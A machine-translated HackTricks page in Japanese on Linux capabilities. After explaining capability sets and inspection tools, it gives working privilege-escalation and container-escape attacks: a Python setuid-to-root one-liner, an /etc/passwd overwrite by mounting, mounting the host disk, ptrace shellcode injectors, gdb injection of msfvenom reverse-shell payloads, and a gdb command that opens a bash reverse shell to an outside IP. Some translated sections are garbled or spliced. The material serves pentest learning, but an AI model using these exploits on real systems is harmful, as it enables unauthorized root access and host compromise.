# Linux Capabilities

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
{% endhint %}

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) は **スペイン** で最も重要なサイバーセキュリティイベントであり、**ヨーロッパ** で最も重要なイベントの一つです。**技術知識の促進**を使命とし、この会議はあらゆる分野の技術とサイバーセキュリティの専門家が集まる熱い交流の場です。\\

{% embed url="https://www.rootedcon.com/" %}

## Linux Capabilities

Linux capabilities は **root 権限をより小さく、異なる単位に分割**し、プロセスが特定の権限のサブセットを持つことを可能にします。これにより、不要に完全な root 権限を付与することなくリスクを最小限に抑えます。

### 問題:
- 通常のユーザーは制限された権限を持ち、root アクセスを必要とするネットワークソケットを開くなどのタスクに影響を与えます。

### 権限セット:

1. **Inherited (CapInh)**:
- **目的**: 親プロセスから引き継がれる権限を決定します。
- **機能**: 新しいプロセスが作成されると、このセットから親の権限を引き継ぎます。プロセスの生成を通じて特定の権限を維持するのに役立ちます。
- **制限**: プロセスは、親が持っていなかった権限を得ることはできません。

2. **Effective (CapEff)**:
- **目的**: プロセスが現在利用している実際の権限を表します。
- **機能**: これは、さまざまな操作の許可を与えるためにカーネルによってチェックされる権限のセットです。ファイルに対しては、このセットがファイルの許可された権限が有効と見なされるかどうかを示すフラグになることがあります。
- **重要性**: 有効なセットは、即時の権限チェックにとって重要であり、プロセスが使用できるアクティブな権限のセットとして機能します。

3. **Permitted (CapPrm)**:
- **目的**: プロセスが持つことができる最大の権限のセットを定義します。
- **機能**: プロセスは、許可されたセットから有効なセットに権限を昇格させ、その権限を使用できるようにします。また、許可されたセットから権限を削除することもできます。
- **境界**: これは、プロセスが持つことができる権限の上限として機能し、プロセスが事前に定義された権限の範囲を超えないようにします。

4. **Bounding (CapBnd)**:
- **目的**: プロセスがそのライフサイクルの間に取得できる権限に上限を設けます。
- **機能**: プロセスが引き継げるまたは許可されたセットに特定の権限を持っていても、その権限がバウンディングセットにも含まれていない限り、その権限を取得することはできません。
- **使用例**: このセットは、プロセスの権限昇格の可能性を制限するのに特に役立ち、追加のセキュリティ層を提供します。

5. **Ambient (CapAmb)**:
- **目的**: 通常はプロセスの権限が完全にリセットされる `execve` システムコールを通じて、特定の権限を維持できるようにします。
- **機能**: 関連するファイル権限を持たない非 SUID プログラムが特定の権限を保持できることを保証します。
- **制限**: このセットの権限は、引き継げるセットと許可されたセットの制約を受け、プロセスの許可された権限を超えないようにします。
```python
# Code to demonstrate the interaction of different capability sets might look like this:
# Note: This is pseudo-code for illustrative purposes only.
def manage_capabilities(process):
if process.has_capability('cap_setpcap'):
process.add_capability_to_set('CapPrm', 'new_capability')
process.limit_capabilities('CapBnd')
process.preserve_capabilities_across_execve('CapAmb')
```
For further information check:

* [https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
* [https://blog.ploetzli.ch/2014/understanding-linux-capabilities/](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)

## プロセスとバイナリの能力

### プロセスの能力

特定のプロセスの能力を確認するには、/proc ディレクトリ内の **status** ファイルを使用します。詳細が多いため、Linux の能力に関連する情報のみに制限しましょう。\
すべての実行中のプロセスの能力情報はスレッドごとに維持され、ファイルシステム内のバイナリには拡張属性に保存されています。

/usr/include/linux/capability.h に定義されている能力を見つけることができます。

現在のプロセスの能力は `cat /proc/self/status` で、他のユーザーの能力は `/proc/<pid>/status` で確認できます。
```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```
このコマンドはほとんどのシステムで5行を返すべきです。

* CapInh = 継承された能力
* CapPrm = 許可された能力
* CapEff = 実効能力
* CapBnd = バウンディングセット
* CapAmb = アンビエント能力セット
```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```
これらの16進数は意味を成しません。capshユーティリティを使用して、それらを能力名にデコードできます。
```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```
では、`ping`で使用される**capabilities**を確認しましょう：
```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
その方法も機能しますが、別の簡単な方法があります。実行中のプロセスの能力を確認するには、単に**getpcaps**ツールを使用し、その後にプロセスID（PID）を続けて入力します。プロセスIDのリストを提供することもできます。
```bash
getpcaps 1234
```
ここで、バイナリに十分な能力（`cap_net_admin` と `cap_net_raw`）を与えた後の `tcpdump` の能力を確認しましょう（_tcpdump はプロセス 9562 で実行中_）：
```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
与えられた能力は、バイナリの能力を取得する2つの方法の結果に対応しています。\
_getpcaps_ツールは、特定のスレッドの利用可能な能力を照会するために**capget()**システムコールを使用します。このシステムコールは、より多くの情報を取得するためにPIDを提供するだけで済みます。

### バイナリの能力

バイナリは、実行中に使用できる能力を持つことがあります。例えば、`ping`バイナリが`cap_net_raw`能力を持っているのを見つけることは非常に一般的です：
```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```
バイナリの**能力を持つものを検索**するには、次のコマンドを使用します:
```bash
getcap -r / 2>/dev/null
```
### capshを使った能力の削除

CAP\_NET\_RAWの能力を_ping_から削除すると、pingユーティリティはもはや機能しなくなるはずです。
```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```
```markdown
_capsh_自体の出力に加えて、_tcpdump_コマンド自体もエラーを引き起こすべきです。

> /bin/bash: /usr/sbin/tcpdump: 操作は許可されていません

このエラーは、pingコマンドがICMPソケットを開くことが許可されていないことを明確に示しています。これで、これが期待通りに機能することが確実になりました。

### 機能の削除

バイナリの機能を削除することができます。
```
```bash
setcap -r </path/to/binary>
```
## ユーザーの能力

明らかに**ユーザーにも能力を割り当てることが可能です**。これはおそらく、ユーザーによって実行されるすべてのプロセスがそのユーザーの能力を使用できることを意味します。\
[これ](https://unix.stackexchange.com/questions/454708/how-do-you-add-cap-sys-admin-permissions-to-user-in-centos-7)、[これ](http://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html)、および[これ](https://stackoverflow.com/questions/1956732/is-it-possible-to-configure-linux-capabilities-per-user)に基づいて、ユーザーに特定の能力を与えるためにいくつかのファイルを新たに設定する必要がありますが、各ユーザーに能力を割り当てるファイルは`/etc/security/capability.conf`です。\
ファイルの例:
```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```
## 環境の能力

次のプログラムをコンパイルすることで、**能力を提供する環境内でbashシェルを生成することが可能です**。

{% code title="ambient.c" %}
```c
/*
* Test program for the ambient capabilities
*
* compile using:
* gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
* Set effective, inherited and permitted capabilities to the compiled binary
* sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
*
* To get a shell with additional caps that can be inherited do:
*
* ./ambient /bin/bash
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
int rc;
capng_get_caps_process();
rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
if (rc) {
printf("Cannot add inheritable cap\n");
exit(2);
}
capng_apply(CAPNG_SELECT_CAPS);
/* Note the two 0s at the end. Kernel checks for these */
if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
perror("Cannot set cap");
exit(1);
}
}
void usage(const char * me) {
printf("Usage: %s [-c caps] new-program new-args\n", me);
exit(1);
}
int default_caplist[] = {
CAP_NET_RAW,
CAP_NET_ADMIN,
CAP_SYS_NICE,
-1
};
int * get_caplist(const char * arg) {
int i = 1;
int * list = NULL;
char * dup = strdup(arg), * tok;
for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
list = realloc(list, (i + 1) * sizeof(int));
if (!list) {
perror("out of memory");
exit(1);
}
list[i - 1] = atoi(tok);
list[i] = -1;
i++;
}
return list;
}
int main(int argc, char ** argv) {
int rc, i, gotcaps = 0;
int * caplist = NULL;
int index = 1; // argv index for cmd to start
if (argc < 2)
usage(argv[0]);
if (strcmp(argv[1], "-c") == 0) {
if (argc <= 3) {
usage(argv[0]);
}
caplist = get_caplist(argv[2]);
index = 3;
}
if (!caplist) {
caplist = (int * ) default_caplist;
}
for (i = 0; caplist[i] != -1; i++) {
printf("adding %d to ambient list\n", caplist[i]);
set_ambient_cap(caplist[i]);
}
printf("Ambient forking shell\n");
if (execv(argv[index], argv + index))
perror("Cannot exec");
return 0;
}
```
{% endcode %}
```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```
**コンパイルされた環境バイナリによって実行されたbashの内部**では、**新しい能力**を観察することが可能です（通常のユーザーは「現在」セクションに能力を持っていません）。
```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```
{% hint style="danger" %}
あなたは**許可されたセットと継承可能なセットの両方に存在する**能力のみを追加できます。
{% endhint %}

### 能力対応/能力無視バイナリ

**能力対応バイナリは、環境によって与えられた新しい能力を使用しません**が、**能力無視バイナリはそれらを使用します**。これは、能力無視バイナリがそれらを拒否しないためです。このため、特定の環境内でバイナリに能力を付与することにより、能力無視バイナリが脆弱になります。

## サービスの能力

デフォルトでは、**rootとして実行されるサービスはすべての能力が割り当てられます**が、場合によってはこれが危険なことがあります。\
したがって、**サービス構成**ファイルでは、**持たせたい能力**と、**サービスを実行すべきユーザー**を**指定**することができ、不要な特権でサービスを実行しないようにします：
```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```
## Dockerコンテナの能力

デフォルトでは、Dockerはコンテナにいくつかの能力を割り当てます。これらの能力が何であるかを確認するのは非常に簡単です。次のコマンドを実行します:
```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) は **スペイン** で最も重要なサイバーセキュリティイベントであり、**ヨーロッパ** で最も重要なイベントの一つです。**技術的知識の促進**を使命とし、この会議はあらゆる分野の技術とサイバーセキュリティの専門家が集まる熱い交流の場です。

{% embed url="https://www.rootedcon.com/" %}

## Privesc/Container Escape

能力は、**特権操作を実行した後に自分のプロセスを制限したい場合**に便利です（例：chrootを設定し、ソケットにバインドした後）。しかし、悪意のあるコマンドや引数を渡すことで、rootとして実行される可能性があります。

`setcap`を使用してプログラムに能力を強制し、`getcap`を使用してこれを照会できます：
```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```
`+ep`は、効果的かつ許可された能力を追加していることを意味します（「-」はそれを削除します）。

システムまたはフォルダー内の能力を持つプログラムを特定するには：
```bash
getcap -r / 2>/dev/null
```
### 攻撃の例

次の例では、バイナリ `/usr/bin/python2.6` が特権昇格に対して脆弱であることが判明します:
```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```
**Capabilities** needed by `tcpdump` to **allow any user to sniff packets**:  
必要な**能力** `tcpdump` によって **任意のユーザーがパケットをスニッフィングできるようにする**:
```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```
### "空"の能力の特別なケース

[ドキュメントから](https://man7.org/linux/man-pages/man7/capabilities.7.html): プログラムファイルに空の能力セットを割り当てることができるため、実行するプロセスの有効および保存されたセットユーザーIDを0に変更するセットユーザーIDルートプログラムを作成することが可能ですが、そのプロセスに能力を付与しません。言い換えれば、次の条件を満たすバイナリがある場合：

1. rootによって所有されていない
2. `SUID`/`SGID`ビットが設定されていない
3. 空の能力セットが設定されている（例：`getcap myelf`が`myelf =ep`を返す）

その**バイナリはrootとして実行されます**。

## CAP\_SYS\_ADMIN

**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)**は非常に強力なLinuxの能力であり、その広範な**管理特権**のためにほぼrootレベルに等しいと見なされます。デバイスのマウントやカーネル機能の操作などが含まれます。全システムをシミュレートするコンテナには不可欠ですが、**`CAP_SYS_ADMIN`は特権昇格やシステムの妥協の可能性があるため、特にコンテナ化された環境では重大なセキュリティ上の課題を引き起こします**。したがって、その使用は厳格なセキュリティ評価と慎重な管理を必要とし、**最小特権の原則**に従い、攻撃面を最小限に抑えるためにアプリケーション固有のコンテナではこの能力を削除することが強く推奨されます。

**バイナリの例**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```
Pythonを使用すると、実際の _passwd_ ファイルの上に修正された _passwd_ ファイルをマウントできます：
```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```
そして最後に、修正された `passwd` ファイルを `/etc/passwd` に **マウント** します：
```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```
そして、パスワード「password」を使用して**`su` as root**を実行できるようになります。

**環境の例（Dockerブレイクアウト）**

Dockerコンテナ内で有効な能力を確認するには、次のコマンドを使用します:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
内部の前の出力では、SYS\_ADMIN能力が有効になっているのがわかります。

* **マウント**

これにより、dockerコンテナは**ホストディスクをマウントし、自由にアクセスすることができます**：
```bash
fdisk -l #Get disk name
Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes

mount /dev/sda /mnt/ #Mount it
cd /mnt
chroot ./ bash #You have a shell inside the docker hosts disk
```
* **フルアクセス**

前の方法では、docker ホストのディスクにアクセスすることができました。\
ホストが **ssh** サーバーを実行していることがわかった場合、**docker ホスト** ディスク内にユーザーを作成し、SSH 経由でアクセスすることができます：
```bash
#Like in the example before, the first step is to mount the docker host disk
fdisk -l
mount /dev/sda /mnt/

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/ adduser john
ssh john@172.17.0.1 -p 2222
```
## CAP\_SYS\_PTRACE

**これは、ホスト内で実行されているプロセスにシェルコードを注入することでコンテナを脱出できることを意味します。** ホスト内で実行されているプロセスにアクセスするには、コンテナは少なくとも **`--pid=host`** で実行する必要があります。

**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** は、`ptrace(2)` によって提供されるデバッグおよびシステムコールトレース機能を使用する能力を付与し、`process_vm_readv(2)` や `process_vm_writev(2)` のようなクロスメモリアタッチ呼び出しを可能にします。診断および監視目的には強力ですが、`CAP_SYS_PTRACE` が `ptrace(2)` に対する seccomp フィルターのような制限措置なしで有効になっている場合、システムのセキュリティを大幅に損なう可能性があります。特に、他のセキュリティ制限、特に seccomp によって課せられた制限を回避するために悪用される可能性があることが、[このような概念実証 (PoC)](https://gist.github.com/thejh/8346f47e359adecd1d53) によって示されています。

**バイナリを使用した例 (python)**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
_fields_ = [
("r15", ctypes.c_ulonglong),
("r14", ctypes.c_ulonglong),
("r13", ctypes.c_ulonglong),
("r12", ctypes.c_ulonglong),
("rbp", ctypes.c_ulonglong),
("rbx", ctypes.c_ulonglong),
("r11", ctypes.c_ulonglong),
("r10", ctypes.c_ulonglong),
("r9", ctypes.c_ulonglong),
("r8", ctypes.c_ulonglong),
("rax", ctypes.c_ulonglong),
("rcx", ctypes.c_ulonglong),
("rdx", ctypes.c_ulonglong),
("rsi", ctypes.c_ulonglong),
("rdi", ctypes.c_ulonglong),
("orig_rax", ctypes.c_ulonglong),
("rip", ctypes.c_ulonglong),
("cs", ctypes.c_ulonglong),
("eflags", ctypes.c_ulonglong),
("rsp", ctypes.c_ulonglong),
("ss", ctypes.c_ulonglong),
("fs_base", ctypes.c_ulonglong),
("gs_base", ctypes.c_ulonglong),
("ds", ctypes.c_ulonglong),
("es", ctypes.c_ulonglong),
("fs", ctypes.c_ulonglong),
("gs", ctypes.c_ulonglong),
]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
# Convert the byte to little endian.
shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
shellcode_byte=int(shellcode_byte_little_endian,16)

# Inject the byte.
libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```
**バイナリの例 (gdb)**

`gdb` と `ptrace` 権限:
```
/usr/bin/gdb = cap_sys_ptrace+ep
```
```markdown
# GDBを介してメモリに注入するためのmsfvenomを使用したシェルコードの作成

msfvenomを使用してシェルコードを作成するには、以下のコマンドを使用します。

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<your_ip> LPORT=<your_port> -f c
```

このコマンドは、指定したIPアドレスとポートを使用してリバースシェルを生成します。

次に、生成されたシェルコードをGDBを使用してメモリに注入します。

```bash
gdb <your_target_program>
```

GDBが起動したら、以下のコマンドを使用してシェルコードを注入します。

```gdb
set {char[<size>]}<address> = {<shellcode>}
```

これにより、指定したアドレスにシェルコードが注入されます。
```
```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (-len(buf) % 8) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
chunk = payload[i:i+8][::-1]
chunks = "0x"
for byte in chunk:
chunks += f"{byte:02x}"

print(f"set {{long}}($rip+{i}) = {chunks}")
```
ルートプロセスをgdbでデバッグし、以前に生成されたgdbの行をコピー＆ペーストします:
```bash
# Let's write the commands to a file
echo 'set {long}($rip+0) = 0x296a909090909090
set {long}($rip+8) = 0x5e016a5f026a9958
set {long}($rip+16) = 0x0002b9489748050f
set {long}($rip+24) = 0x48510b0e0a0a2923
set {long}($rip+32) = 0x582a6a5a106ae689
set {long}($rip+40) = 0xceff485e036a050f
set {long}($rip+48) = 0x6af675050f58216a
set {long}($rip+56) = 0x69622fbb4899583b
set {long}($rip+64) = 0x8948530068732f6e
set {long}($rip+72) = 0x050fe689485752e7
c' > commands.gdb
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) source commands.gdb
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```
**環境の例 (Dockerブレイクアウト) - 別のgdbの悪用**

**GDB** がインストールされている場合（または `apk add gdb` や `apt install gdb` でインストールできます）には、**ホストからプロセスをデバッグ**し、`system` 関数を呼び出すことができます。（この技術は `SYS_ADMIN` 権限も必要です）**。**
```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```
コマンドの出力を見ることはできませんが、そのプロセスによって実行されます（したがって、revシェルを取得します）。

{% hint style="warning" %}
「現在のコンテキストに "system" というシンボルがありません。」というエラーが表示された場合は、gdbを介してプログラムにシェルコードをロードする前の例を確認してください。
{% endhint %}

**環境を使用した例（Dockerブレイクアウト） - シェルコードインジェクション**

Dockerコンテナ内で有効な能力を確認するには、次のコマンドを使用できます：
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```
リスト **プロセス** が実行中の **ホスト** `ps -eaf`

1. **アーキテクチャ** を取得 `uname -m`
2. アーキテクチャ用の **シェルコード** を見つける ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. プロセスメモリに **シェルコード** を **注入** するための **プログラム** を見つける ([https://github.com/0x00pf/0x00sec\_code/blob/master/mem\_inject/infect.c](https://github.com/0x00pf/0x00sec\_code/blob/master/mem\_inject/infect.c))
4. プログラム内の **シェルコード** を **修正** し、**コンパイル** する `gcc inject.c -o inject`
5. **注入** して **シェル** を取得する: `./inject 299; nc 172.17.0.1 5600`

## CAP\_SYS\_MODULE

**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** はプロセスに **カーネルモジュールをロードおよびアンロードする権限を与えます（`init_module(2)`、`finit_module(2)` および `delete_module(2)` システムコール）**。これにより、カーネルのコア操作に直接アクセスできるようになります。この機能は重大なセキュリティリスクをもたらし、特権昇格やシステム全体の侵害を可能にします。カーネルの変更を許可することで、Linuxのセキュリティメカニズム、Linux Security Modulesやコンテナの隔離をすべてバイパスします。
**これは、ホストマシンのカーネルにカーネルモジュールを** **挿入/削除** **できることを意味します。**

**バイナリの例**

次の例では、バイナリ **`python`** がこの機能を持っています。
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```
